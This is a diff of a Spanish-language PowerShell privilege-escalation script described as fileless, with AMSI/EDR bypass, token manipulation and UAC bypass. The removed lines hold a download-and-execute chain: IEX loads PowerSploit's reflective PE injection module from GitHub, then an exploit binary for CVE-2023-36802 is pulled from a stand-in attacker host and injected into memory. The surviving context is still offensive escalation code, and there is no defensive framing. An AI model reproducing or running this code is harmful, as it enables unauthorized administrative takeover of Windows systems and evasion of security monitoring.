@@ -1,6 +1,3 @@
-# Script de Elevación Automática de Privilegios - Fileless en Memoria
-# Incluye bypass de AMSI/EDR y múltiples técnicas de escalada
-
 Write-Host "=== ELEVACIÓN AUTOMÁTICA DE PRIVILEGIOS ===" -ForegroundColor Cyan
 Write-Host "[+] Iniciando proceso de escalada de privilegios..." -ForegroundColor Yellow
 
@@ -112,29 +109,6 @@ if (-not $success) {
         }
     } catch {
         Write-Host "[!] Error en manipulación de tokens: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    
-    # b. Uso de vulnerabilidades conocidas
-    if (-not $success) {
-        try {
-            Write-Host "[+] Intentando explotar vulnerabilidades del kernel..." -ForegroundColor Cyan
-            
-            # Cargar módulo de inyección PE
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')
-            
-            # Descargar y ejecutar exploit en memoria (ejemplo para CVE-2023-36802)
-            $exploitUrl = "http://attacker-server.com/exploits/CVE-2023-36802.exe"
-            $exploitBytes = (Invoke-WebRequest -Uri $exploitUrl -UseBasicParsing).Content
-            Invoke-ReflectivePEInjection -PEBytes $exploitBytes -ForceASLR
-            
-            Start-Sleep -Seconds 5
-            if (Test-Admin) {
-                Write-Host "[+] ¡Éxito con explotación de vulnerabilidad!" -ForegroundColor Green
-                $success = $true
-            }
-        } catch {
-            Write-Host "[!] Error en explotación de vulnerabilidad: $($_.Exception.Message)" -ForegroundColor Red
-        }
     }
     
     # c. Bypass UAC
